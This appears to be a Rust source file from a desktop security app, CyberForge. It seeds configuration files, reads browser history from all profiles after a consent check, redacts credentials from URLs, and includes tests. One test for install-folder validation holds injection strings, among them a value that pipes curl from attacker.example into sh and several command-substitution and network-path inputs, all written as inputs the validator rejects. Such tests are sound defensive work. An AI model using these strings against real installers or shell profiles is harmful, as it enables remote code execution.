            "scanning": { "backgroundScan": true, "scanHistory": true, "activeTabPriority": true, "intervalSeconds": 300 },
            "protection": { "hostsFileBlocking": true, "autoBlockMalicious": false, "notifyOnThreat": true },
            "ai": { "provider": "deepseek", "model": "deepseek-ai/DeepSeek-V3-0324", "maxTokens": 1800, "groundInMemory": true },
            "telemetry": { "localOnly": true, "shareWithCloud": false },
            "appearance": { "theme": "dark", "reduceMotion": false }
        }))
        .unwrap_or_else(|_| "{}".into()),
    );

    // 6) UI preferences template.
    seed(
        dir.join("config").join("preferences.json"),
        &serde_json::to_string_pretty(&serde_json::json!({
            "theme": "dark", "reduceMotion": false, "sidebarCollapsed": false, "lastPage": "threat-overview.html"
        }))
        .unwrap_or_else(|_| "{}".into()),
    );

    // 7) Default response-policy template.
    seed(
        dir.join("config").join("policies.json"),
        &serde_json::to_string_pretty(&serde_json::json!({
            "schemaVersion": 1,
            "policies": [
                { "id": "block-phishing", "when": "verdict=phishing", "action": "block", "enabled": true },
                { "id": "warn-suspicious", "when": "risk>=50", "action": "warn", "enabled": true },
                { "id": "log-all-scans", "when": "any", "action": "log", "enabled": true }
            ]
        }))
        .unwrap_or_else(|_| "{}".into()),
    );

    // 8) Integrations descriptor.
    seed(
        dir.join("config").join("integrations.json"),
        &serde_json::to_string_pretty(&serde_json::json!({
            "backend": { "url": crate::state::backend_url(), "enabled": true },
            "huggingface": { "provider": "DeepSeek via HF Inference", "configured": false },
            "threatIntel": { "provider": "AlienVault OTX", "enabled": true }
        }))
        .unwrap_or_else(|_| "{}".into()),
    );

    // 9) ML model registry — the real capabilities the app uses.
    seed(
        dir.join("models").join("registry.json"),
        &serde_json::to_string_pretty(&serde_json::json!({
            "models": [
                { "id": "deepseek-v3", "role": "assistant", "provider": "huggingface" },
                { "id": "url-classifier", "role": "phishing-url" },
                { "id": "dga-detector", "role": "domain-generation-algorithm" },
                { "id": "ioc-scanner", "role": "indicator-of-compromise" }
            ]
        }))
        .unwrap_or_else(|_| "{}".into()),
    );

    // 10) Log files — initialise with an install line so logs/ is non-empty.
    let log_line = format!(
        "[{}] CyberForge {} initialised on {}/{} — data dir prepared.\n",
        now,
        env!("CARGO_PKG_VERSION"),
        os,
        arch
    );
    seed(dir.join("logs").join("app.log"), &log_line);
    seed(dir.join("logs").join("audit.log"), &log_line);

    // 11) A self-describing README for the whole data directory.
    seed(
        dir.join("README.txt"),
        "CyberForge - local data directory\n\
            =================================\n\n\
            Everything CyberForge stores stays on this device, in this folder.\n\
            Nothing here is uploaded unless you explicitly sync.\n\n\
            Layout:\n\
            - manifest.json    App + install descriptor.\n\
            - version          Installed version.\n\
            - hf_config.json   Import slot for a Hugging Face token. A token pasted here is\n\
            \x20                  moved to the system credential store at the next start and\n\
            \x20                  removed from this file.\n\
            - config/          settings.json, preferences.json, policies.json, integrations.json\n\
            - logs/            app.log, audit.log\n\
            - cache/           Transient scan/render cache.\n\
            - intel/           Threat-intelligence cache (OTX pulses, indicators).\n\
            - quarantine/      Artifacts from blocked / flagged sites.\n\
            - reports/         Saved report exports.\n\
            - models/          ML model registry + metadata.\n\
            - backups/         Rolling config backups.\n\
            - profiles/        Per-browser collected-history working area.\n\
            - rules/           Detection rule sets.\n\n\
            Created on first run by the app. Files written as you use it:\n\
            - memories.json    Local vector memory: scans, intel, reports, actions.\n\
            - blocklist.json / protected.json / allowed.json   Your site lists.\n\
            - device.json      This installation's ID and device ID (its key is in the\n\
            \x20                  system credential store, not here).\n\
            - hosts.original / hosts.previous   The hosts file before CyberForge's first\n\
            \x20                  change and before its latest one. Copy hosts.original over\n\
            \x20                  the hosts file (as administrator) to undo every block.\n\
            - session.json     Your cached profile, so the app can open offline. The\n\
            \x20                  sign-in token is in the system credential store, not here.\n\
            - install.json     One-time install marker.\n\n\
            To remove all CyberForge data, delete this folder (or run the\n\
            uninstall script shipped with the app).\n",
    );
}

// ──────────────────────────────────────────────
// One-time installation marker (per user/computer)
// ──────────────────────────────────────────────

/// The install-completed marker file, under the OS app-config dir
/// (e.g. `%APPDATA%\com.cyberforge.console\install.json`). Its presence is what
/// the entry page uses to decide "show the installer" vs "run the app".
fn install_marker(app: &tauri::AppHandle) -> Option<std::path::PathBuf> {
    use tauri::Manager;
    app.path().app_config_dir().ok().map(|d| d.join("install.json"))
}

/// Has CyberForge already been installed on this machine for this user?
#[tauri::command]
pub async fn is_installed(app: tauri::AppHandle) -> Result<Value, String> {
    let installed = install_marker(&app).map(|p| p.exists()).unwrap_or(false);
    Ok(json!({ "success": true, "installed": installed }))
}

/// Record that installation finished, so the wizard never runs again on this
/// machine (delete the file to re-run the installer during development).
#[tauri::command]
pub async fn mark_installed(
    app: tauri::AppHandle,
    install_dir: Option<String>,
) -> Result<Value, String> {
    // recorded only: checked the same way as the folder add_to_path uses
    checked_bin(install_dir.as_deref())?;
    let path = install_marker(&app).ok_or_else(|| "no app-config dir".to_string())?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let when = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let body = json!({
        "installed": true,
        "version": "2.0.0",
        "installedAt": when,
        "installDir": install_dir.unwrap_or_default(),
        "os": std::env::consts::OS,
    });
    let text = serde_json::to_string_pretty(&body).unwrap_or_else(|_| "{}".into());
    std::fs::write(&path, text).map_err(|e| e.to_string())?;
    Ok(json!({ "success": true, "path": path.to_string_lossy() }))
}

// ──────────────────────────────────────────────
// Browser history → real URLs to scan in real time
// ──────────────────────────────────────────────

/// Chrome/Edge/Brave store `last_visit_time` as microseconds since 1601-01-01.
fn chromium_to_unix(t: i64) -> i64 {
    if t <= 0 {
        0
    } else {
        t / 1_000_000 - 11_644_473_600
    }
}

/// Copy a (browser-locked) history DB to a temp file and read recent rows from
/// the copy read-only. Returns (url, title, last_visit_unix). Copying first
/// means we never contend with the browser's lock on the live database.
fn read_history_db(db: &str, firefox: bool, limit: usize) -> Vec<(String, String, i64)> {
    use rusqlite::{Connection, OpenFlags};
    use std::sync::atomic::{AtomicU64, Ordering};
    // Unique temp name per copy: nanos alone can collide when many profiles are
    // copied in parallel, so we append a process-wide monotonic counter.
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let seq = SEQ.fetch_add(1, Ordering::Relaxed);
    let tmp = std::env::temp_dir().join(format!("cf_hist_{}_{}.sqlite", stamp, seq));
    if std::fs::copy(db, &tmp).is_err() {
        return Vec::new();
    }
    let mut out = Vec::new();
    if let Ok(conn) = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    ) {
        let sql = if firefox {
            "SELECT url, COALESCE(title,''), COALESCE(last_visit_date,0) FROM moz_places \
             WHERE url LIKE 'http%' AND last_visit_date IS NOT NULL \
             ORDER BY last_visit_date DESC LIMIT ?1"
        } else {
            "SELECT url, COALESCE(title,''), COALESCE(last_visit_time,0) FROM urls \
             WHERE url LIKE 'http%' ORDER BY last_visit_time DESC LIMIT ?1"
        };
        if let Ok(mut stmt) = conn.prepare(sql) {
            if let Ok(rows) = stmt.query_map([limit as i64], |r| {
                Ok((
                    r.get::<_, String>(0)?,
                    r.get::<_, String>(1).unwrap_or_default(),
                    r.get::<_, i64>(2).unwrap_or(0),
                ))
            }) {
                for (url, title, ts) in rows.flatten() {
                    let unix = if firefox { ts / 1_000_000 } else { chromium_to_unix(ts) };
                    out.push((url, title, unix));
                }
            }
        }
    }
    let _ = std::fs::remove_file(&tmp);
    out
}

/// Every on-disk history database for a browser, across **all** of its profiles
/// (not just `Default`). Chromium keeps one `History` file per profile directory
/// under `User Data` (`Default`, `Profile 1`, …); Firefox keeps one
/// `places.sqlite` per profile under `Profiles`. Reading the file directly is
/// what lets us collect history even while the browser is closed.
fn history_db_paths(d: &BrowserDef) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();

    if d.firefox {
        // Every `<profile>/places.sqlite` under the Profiles directory.
        if let Some(dir) = d.history_paths.first() {
            if let Ok(rd) = std::fs::read_dir(dir) {
                for entry in rd.flatten() {
                    let cand = entry.path().join("places.sqlite");
                    if cand.exists() {
                        if let Some(s) = cand.to_str() {
                            out.push(s.to_string());
                        }
                    }
                }
            }
        }
        return out;
    }

    // Chromium family: the listed path ends in `…/User Data/Default/History`.
    // Walk every sibling profile directory and collect each `History` file.
    if let Some(p) = d.history_paths.first() {
        let path = Path::new(p);
        let is_chromium = path.file_name().map(|f| f == "History").unwrap_or(false);
        if is_chromium {
            if let Some(user_data) = path.parent().and_then(|pp| pp.parent()) {
                if let Ok(rd) = std::fs::read_dir(user_data) {
                    for entry in rd.flatten() {
                        if entry.path().is_dir() {
                            let cand = entry.path().join("History");
                            if cand.exists() {
                                if let Some(s) = cand.to_str() {
                                    out.push(s.to_string());
                                }
                            }
                        }
                    }
                }
            }
            // Fall back to the literal Default path if enumeration found nothing.
            if out.is_empty() && path.exists() {
                out.push(p.clone());
            }
            return out;
        }
    }

    // Anything else (e.g. Safari `History.db`): the listed single DB if present.
    for p in &d.history_paths {
        if Path::new(p).exists() {
            out.push(p.clone());
        }
    }
    out
}

/// The friendly profile name for a DB path (the parent directory: `Default`,
/// `Profile 1`, a Firefox profile folder, …). Used only for display/grouping.
fn profile_label(db_path: &str) -> String {
    Path::new(db_path)
        .parent()
        .and_then(|p| p.file_name())
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_default()
}

fn now_unix() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Build the aggregate history JSON from already-read rows: newest first,
/// de-duplicated by URL, capped, with a per-browser breakdown.
fn assemble_history(
    mut items: Vec<Value>,
    by_browser: std::collections::BTreeMap<String, u64>,
    sources: u32,
    cap: usize,
) -> Value {
    // Credentials are removed from every address before it is kept, listed,
    // scanned or written to disk. Done first, so addresses that differ only in
    // a token are counted once.
    for item in items.iter_mut() {
        if let Some(clean) = item.get("url").and_then(|u| u.as_str()).map(redact_url) {
            item["url"] = Value::String(clean);
        }
    }
    items.sort_by(|a, b| {
        b["lastVisit"].as_i64().unwrap_or(0).cmp(&a["lastVisit"].as_i64().unwrap_or(0))
    });
    let mut seen = std::collections::HashSet::new();
    items.retain(|it| seen.insert(it["url"].as_str().unwrap_or("").to_string()));
    let total_unique = items.len();
    items.truncate(cap);
    json!({
        "success": true,
        "data": {
            "history": items,
            "count": items.len(),
            "totalUnique": total_unique,
            "byBrowser": by_browser,
            "sources": sources,
            "collectedAt": now_unix(),
        }
    })
}

/// Synchronous full collection (used by the diagnostic test). Reads every
/// profile DB of every detected browser in sequence.
#[cfg(test)]
fn compute_history(per_db: usize, cap: usize) -> Value {
    let defs = browser_defs();
    let mut items: Vec<Value> = Vec::new();
    let mut by_browser: std::collections::BTreeMap<String, u64> = std::collections::BTreeMap::new();
    let mut sources = 0u32;
    for d in &defs {
        for db in history_db_paths(d) {
            let profile = profile_label(&db);
            let rows = read_history_db(&db, d.firefox, per_db);
            if !rows.is_empty() {
                sources += 1;
            }
            *by_browser.entry(d.name.to_string()).or_insert(0) += rows.len() as u64;
            for (url, title, ts) in rows {
                items.push(json!({
                    "url": url, "title": title, "browser": d.name,
                    "profile": profile, "lastVisit": ts,
                }));
            }
        }
    }
    assemble_history(items, by_browser, sources, cap)
}

/// **Background-friendly full collection.** Reads every profile database of every
/// detected browser **in parallel** — each blocking SQLite copy-and-read runs on
/// the blocking thread pool via `spawn_blocking`, so a machine with several
/// browsers and many profiles is collected concurrently rather than one by one.
/// This is the workhorse the startup collector and the UI commands both use.
pub async fn collect_history_snapshot(per_db: usize, cap: usize) -> Value {
    // Enumerate (browser, firefox, profile, db-path) jobs up front.
    let mut jobs: Vec<(String, bool, String, String)> = Vec::new();
    for d in browser_defs() {
        for db in history_db_paths(&d) {
            let profile = profile_label(&db);
            jobs.push((d.name.to_string(), d.firefox, profile, db));
        }
    }

    // Fan out: one blocking task per database.
    let mut handles = Vec::with_capacity(jobs.len());
    for (name, firefox, profile, db) in jobs {
        handles.push(tokio::task::spawn_blocking(move || {
            let rows = read_history_db(&db, firefox, per_db);
            (name, profile, rows)
        }));
    }

    // Fan in.
    let mut items: Vec<Value> = Vec::new();
    let mut by_browser: std::collections::BTreeMap<String, u64> = std::collections::BTreeMap::new();
    let mut sources = 0u32;
    for h in handles {
        if let Ok((name, profile, rows)) = h.await {
            if !rows.is_empty() {
                sources += 1;
            }
            *by_browser.entry(name.clone()).or_insert(0) += rows.len() as u64;
            for (url, title, ts) in rows {
                items.push(json!({
                    "url": url, "title": title, "browser": name,
                    "profile": profile, "lastVisit": ts,
                }));
            }
        }
    }

    let snapshot = assemble_history(items, by_browser, sources, cap);

    #[cfg(debug_assertions)]
    eprintln!(
        "[cyberforge] history collected: {} URLs from {} profile(s)",
        snapshot.pointer("/data/count").and_then(|v| v.as_i64()).unwrap_or(0),
        snapshot.pointer("/data/sources").and_then(|v| v.as_i64()).unwrap_or(0),
    );

    snapshot
}

/// Run a full collection and store it in shared state (so UI commands serve it
/// instantly). Called by the startup background task and on cache-miss.
pub async fn refresh_history(state: &SharedState) -> Value {
    // the collector reads nothing unless the user turned history reading on (SEC-07)
    if let Err(reason) = crate::privacy::require(crate::privacy::Feature::HistoryAccess) {
        return json!({ "success": false, "error": reason, "data": null });
    }
    let snapshot = collect_history_snapshot(HISTORY_PER_DB, HISTORY_CAP).await;
    let mut s = state.lock().await;
    s.history_cache = Some((Instant::now(), snapshot.clone()));
    snapshot
}

/// Cached history: serve the background snapshot while it is fresh, otherwise
/// collect on demand. Mirrors the other cached-snapshot accessors in this file.
pub async fn history_data(state: &SharedState) -> Value {
    {
        let s = state.lock().await;
        if let Some((t, v)) = &s.history_cache {
            if t.elapsed() < HISTORY_TTL {
                return v.clone();
            }
        }
    }
    refresh_history(state).await
}

/// Persist the latest snapshot to the app-config dir so the collection survives
/// restarts and is available locally (never uploaded anywhere).
/// Delete the copy of browser history this app keeps: the cached snapshot and
/// the file it is saved to. Returns how many files were removed.
pub async fn clear_collected_history(state: &SharedState) -> usize {
    state.lock().await.history_cache = None;
    let mut removed = 0;
    if let Some(dir) = crate::auth::config_dir() {
        for name in ["history_collection.json"] {
            if std::fs::remove_file(dir.join(name)).is_ok() {
                removed += 1;
            }
        }
    }
    removed
}

pub fn persist_history_snapshot(app: &tauri::AppHandle, snapshot: &Value) {
    use tauri::Manager;
    if !crate::privacy::allowed(crate::privacy::Feature::HistoryAccess) {
        return;
    }
    // Only the owner of this computer's state writes the saved copy (ownership.rs).
    if !crate::ownership::is_owner_or_unenforced() {
        return;
    }
    if let Ok(dir) = app.path().app_config_dir() {
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("history_collection.json");
        if let Ok(text) = serde_json::to_string(snapshot) {
            let _ = std::fs::write(path, text);
        }
    }
}

/// Recent real URLs from the user's browser history (all detected browsers, all
/// profiles, newest first, de-duplicated). Served from the background snapshot
/// when available. The UI scans these with the ML backend so the agent analyses
/// actually-visited sites in real time — no extension needed.
#[tauri::command]
pub async fn get_browser_history(
    state: State<'_, SharedState>,
    limit: Option<usize>,
) -> Result<Value, String> {
    crate::privacy::require(crate::privacy::Feature::HistoryAccess)?;
    let limit = limit.unwrap_or(25).clamp(1, 200);
    let snapshot = history_data(state.inner()).await;
    // Slice the cached aggregate down to the requested size without re-reading.
    let sliced: Vec<Value> = snapshot
        .pointer("/data/history")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().take(limit).cloned().collect())
        .unwrap_or_default();
    Ok(json!({
        "success": true,
        "data": {
            "history": sliced,
            "count": snapshot.pointer("/data/history")
                .and_then(|v| v.as_array()).map(|a| a.len().min(limit)).unwrap_or(0),
            "totalUnique": snapshot.pointer("/data/totalUnique").cloned().unwrap_or(json!(0)),
            "byBrowser": snapshot.pointer("/data/byBrowser").cloned().unwrap_or(json!({})),
            "collectedAt": snapshot.pointer("/data/collectedAt").cloned().unwrap_or(json!(0)),
        }
    }))
}

/// The full background-collected history snapshot (all browsers, all profiles).
/// Served instantly from the in-memory cache the startup collector populates.
#[tauri::command]
pub async fn get_collected_history(state: State<'_, SharedState>) -> Result<Value, String> {
    crate::privacy::require(crate::privacy::Feature::HistoryAccess)?;
    Ok(history_data(state.inner()).await)
}

#[cfg(test)]
mod diag {
    use super::*;
    /// Manual diagnostic for "browsers not detected" reports. Run it on the
    /// machine in question to see exactly what the local detection finds:
    ///   cargo test --lib dbg_browsers -- --nocapture
    /// It prints the process count, the browser-looking processes, and the full
    /// `compute_browsers()` JSON (installed / running / history).
    #[test]
    fn dbg_browsers() {
        let mut sys = System::new_all();
        sys.refresh_all();
        assert!(sys.processes().len() > 0, "sysinfo enumerated no processes");
        eprintln!("PROC_COUNT={}", sys.processes().len());
        let browser_procs: Vec<String> = sys
            .processes()
            .values()
            .map(|p| p.name().to_string_lossy().to_lowercase())
            .filter(|n| {
                ["chrome", "msedge", "firefox", "brave", "opera", "safari", "chromium"]
                    .iter()
                    .any(|k| n.contains(k))
            })
            .collect();
        eprintln!("BROWSER_PROCS={:?}", browser_procs);
        let detected = compute_browsers();
        assert_eq!(detected["success"], serde_json::json!(true));
        eprintln!("DETECT={}", detected);
    }

    /// Manual diagnostic: `cargo test --lib dbg_history -- --nocapture`
    /// Confirms the user's real browser history is readable on this machine.
    #[test]
    fn dbg_history() {
        let v = compute_history(50, 500);
        eprintln!("[cyberforge] history count={}", v["data"]["count"]);
        if let Some(arr) = v["data"]["history"].as_array() {
            for it in arr.iter().take(6) {
                eprintln!(
                    "  {} [{}]",
                    it["url"].as_str().unwrap_or(""),
                    it["browser"].as_str().unwrap_or("")
                );
            }
        }
        assert_eq!(v["success"], serde_json::json!(true));
    }
}

#[cfg(test)]
mod redaction_tests {
    use super::*;
    use cyberforge_core::redact::{is_secret_parameter, REDACTED};

    #[test]
    fn credentials_in_a_query_are_removed_and_the_rest_is_kept() {
        assert_eq!(
            redact_url("https://accounts.example.com/signin/oauth?client_id=abc&code=4/0AfJohXkabc&state=xyz123&hl=en"),
            "https://accounts.example.com/signin/oauth?client_id=abc&code=[redacted]&state=[redacted]&hl=en"
        );
        assert_eq!(
            redact_url("https://app.example.com/reset?_autologintoken=abcdef123456&next=/home"),
            "https://app.example.com/reset?_autologintoken=[redacted]&next=/home"
        );
        assert_eq!(
            redact_url("https://api.example.com/v1/items?api_key=K1&session_id=S2&csrfToken=C3&page=2"),
            "https://api.example.com/v1/items?api_key=[redacted]&session_id=[redacted]&csrfToken=[redacted]&page=2"
        );
    }

    #[test]
    fn a_token_is_recognised_by_its_shape_whatever_it_is_called() {
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
        assert_eq!(redact_url(&format!("https://example.com/open?t={}", jwt)), "https://example.com/open?t=[redacted]");
        assert_eq!(redact_url(&format!("https://example.com/verify/{}/done", jwt)), "https://example.com/verify/[redacted]/done");
        assert_eq!(
            redact_url("https://example.com/cb#access_token=ya29.a0AfH6SMBx&token_type=Bearer&expires_in=3599"),
            "https://example.com/cb#access_token=[redacted]&token_type=[redacted]&expires_in=3599"
        );
        let opaque = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6";
        assert_eq!(redact_url(&format!("https://example.com/dl?ref={}", opaque)), "https://example.com/dl?ref=[redacted]");
    }

    #[test]
    fn a_password_in_the_address_itself_is_removed() {
        assert_eq!(redact_url("https://alice:s3cret@intranet.example.com/wiki?page=1"), "https://intranet.example.com/wiki?page=1");
    }

    #[test]
    fn ordinary_addresses_are_unchanged() {
        for url in [
            "https://example.com/",
            "https://example.com/docs/getting-started#install",
            "https://www.google.com/search?q=how+to+rotate+an+api+key+in+2026+without+downtime+for+users&hl=en",
            "https://shop.example.com/products?category=laptops&sort=price&page=3",
            "https://github.com/rust-lang/rust/issues/12345",
            "http://192.168.1.1/admin/index.html",
            "chrome://settings/",
            "mailto:someone@example.com",
        ] {
            assert_eq!(redact_url(url), url);
        }
    }

    #[test]
    fn the_collected_history_holds_no_credentials_and_counts_an_address_once() {
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
        let items = vec![
            json!({ "url": format!("https://example.com/stream?token={}", jwt), "title": "a", "lastVisit": 30 }),
            json!({ "url": "https://example.com/stream?token=another-session-token", "title": "b", "lastVisit": 20 }),
            json!({ "url": "https://example.org/page", "title": "c", "lastVisit": 10 }),
        ];
        let snapshot = assemble_history(items, std::collections::BTreeMap::new(), 1, 50);
        let text = snapshot.to_string();
        assert!(!text.contains("eyJ") && !text.contains("another-session-token"));
        assert_eq!(snapshot["data"]["count"], 2, "two visits to the same page with different tokens are one address");
        assert_eq!(snapshot["data"]["history"][0]["url"], "https://example.com/stream?token=[redacted]");
    }

    /// Diagnostic over the history file already on this machine. Prints counts
    /// only, never an address. Not part of the normal run:
    ///   cargo test --lib redaction_tests::the_file_on_this_machine -- --ignored --nocapture
    #[test]
    #[ignore]
    fn the_file_on_this_machine_would_hold_no_credential_shaped_values() {
        let Ok(appdata) = std::env::var("APPDATA") else { return };
        let path = std::path::PathBuf::from(appdata).join("com.cyberforge.console").join("history_collection.json");
        let Ok(text) = std::fs::read_to_string(&path) else { println!("no history file on this machine"); return };
        let stored: Value = serde_json::from_str(&text).expect("the file is JSON");
        let urls: Vec<String> = stored["data"]["history"].as_array().map(|a| a.iter().filter_map(|i| i["url"].as_str().map(String::from)).collect()).unwrap_or_default();
        let jwt_like = |u: &str| u.split(|c: char| !(c.is_ascii_alphanumeric() || "_-.".contains(c))).any(|t| t.starts_with("eyJ") && t.len() >= 40 && t.contains('.'));
        let before = urls.iter().filter(|u| jwt_like(u)).count();
        let cleaned: Vec<String> = urls.iter().map(|u| redact_url(u)).collect();
        let after = cleaned.iter().filter(|u| jwt_like(u)).count();
        let changed = urls.iter().zip(&cleaned).filter(|(a, b)| a != b).count();
        let named_left = cleaned.iter().filter(|u| u.split(['?', '&', '#']).skip(1).any(|pair| matches!(pair.split_once('='), Some((n, v)) if is_secret_parameter(n) && !v.is_empty() && v != REDACTED))).count();
        println!("addresses: {} | changed by redaction: {} | holding a JWT-shaped value before: {} after: {} | credential-named parameters left with a value: {}", urls.len(), changed, before, after, named_left);
        assert_eq!(after, 0);
        assert_eq!(named_left, 0);
    }
}


#[cfg(test)]
mod install_dir_tests {
    use super::checked_bin;

    #[test]
    fn no_folder_means_the_default() {
        assert!(checked_bin(None).unwrap().ends_with("bin"));
        assert!(checked_bin(Some("   ")).unwrap().ends_with("bin"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn a_windows_folder_is_a_full_local_path_with_nothing_extra() {
        assert_eq!(checked_bin(Some(r"C:\Tools\CyberForge")).unwrap(), r"C:\Tools\CyberForge\bin");
        for bad in [
            r"Tools\CyberForge",                      // relative
            r"C:\Tools;C:\Users\Public\evil",         // a second PATH entry
            r"\\attacker.example\share\tools",       // network path
            "//attacker.example/share/tools",        // network path, forward slashes
            r"C:\Tools\..\Windows\Temp",              // climbs out
            "C:\\Tools\nC:\\evil",                  // control character
            r#"C:\Tools"\x"#,
        ] {
            assert!(checked_bin(Some(bad)).is_err(), "accepted {bad:?}");
        }
        assert!(checked_bin(Some(&format!(r"C:\{}", "a".repeat(450)))).is_err());
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn a_unix_folder_cannot_inject_into_the_shell_profile() {
        assert_eq!(checked_bin(Some("/opt/cyberforge")).unwrap(), "/opt/cyberforge/bin");
        for bad in [
            "opt/cyberforge",
            "/opt/x\"; curl https://attacker.example | sh; echo \"",
            "/opt/$(id)",
            "/opt/`id`",
            "/opt/a:/tmp/evil",
            "/opt/../tmp",
            "/opt/a\\b",
        ] {
            assert!(checked_bin(Some(bad)).is_err(), "accepted {bad:?}");
        }
    }
}
